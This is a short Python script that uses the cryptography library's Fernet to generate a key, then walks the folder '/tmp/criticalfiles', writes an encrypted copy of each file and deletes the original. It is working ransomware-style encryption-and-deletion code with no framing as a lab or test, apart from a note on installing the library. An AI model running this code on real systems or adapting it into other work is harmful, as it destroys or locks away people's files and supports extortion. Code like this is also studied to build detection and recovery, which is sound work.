import os
from cryptography.fernet import Fernet
#Note: Must have cryptography instlaled via "pip3 install cryptography"

def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
        new_file = filename + ".encrypted"
        # encrypt data
    encrypted_data = f.encrypt(file_data)
    with open(new_file, "wb") as file:
        file.write(encrypted_data)

def main(folder_path):
    for path, subdirs, files in os.walk(folder_path):
        for name in files:
            file_path = os.path.join(path,name)
            encrypt(file_path, key)
            os.remove(file_path)

# Driver Code
if __name__ == '__main__':
    # Calling main() function
    write_key()
    key = load_key()
    encrypt_path = "/tmp/criticalfiles"
    main(encrypt_path)